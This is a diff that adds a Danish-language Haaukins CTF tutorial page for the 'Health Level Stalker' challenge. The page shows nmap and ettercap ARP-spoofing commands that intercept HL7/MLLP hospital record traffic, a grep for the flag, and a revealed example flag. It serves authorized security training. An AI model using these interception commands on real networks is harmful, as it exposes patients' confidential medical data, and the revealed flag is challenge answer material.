@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Health Level Stalker — tutorial (HL7/MLLP)</title>
+<meta name="description" content="Guide til Haaukins Health Level Stalker: MITM en HL7/MLLP-strøm (port 2575) og find flaget i en patientjournal.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Health Level Stalker</h1>
+<p class="subtitle">Aflyt en HL7-journal-udveksling og find flaget i et segment.</p>
+<div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="arp-mitm.html">Primer: ARP-spoofing &amp; MITM</a>.</div>
+<h2>Hvad går opgaven ud på?</h2>
+<p>Et hospital sender journaler med "et meget normalt protokol" = <strong>HL7 v2</strong>, pakket i
+             <strong>MLLP over TCP (port 2575)</strong>. HL7 er klartekst-segmenter adskilt af <code>|</code> og
+             <code>^</code> (<code>MSH</code>, <code>PID</code>, <code>OBR</code>, <code>OBX</code> …), så en MITM kan
+             læse hele journalen.</p>
+<h2>Trin for trin</h2>
+<pre><code>sudo nmap -Pn -p2575 --open &lt;subnet&gt;/24      # find HL7-serveren
+sudo ettercap -T -q -i eth0 -M arp:remote -w /tmp/hl7.pcap /&lt;server&gt;// ///
+# tekst-protokol -> ofte nok:
+strings /tmp/hl7.pcap | grep -aoiE '(HKN|DDC)\{[^}]*\}'</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flaget lå indlejret i en OBR-segment i en patients lab-ordre.</p>
+        <p>Flag (eksempel): <span class="flag">HKN{6p-eWi-CAk95}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>"Et meget normalt protokol" til patientdata = HL7 (ofte MLLP/2575). Ukendt port? Scan efter den.</li><li>Tekst-protokoller kan ofte løses med <code>strings | grep</code> før du dykker i segmenterne.</li><li>Samme MITM-teknik virker uanset protokol — kun hvor flaget gemmer sig ændrer sig.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
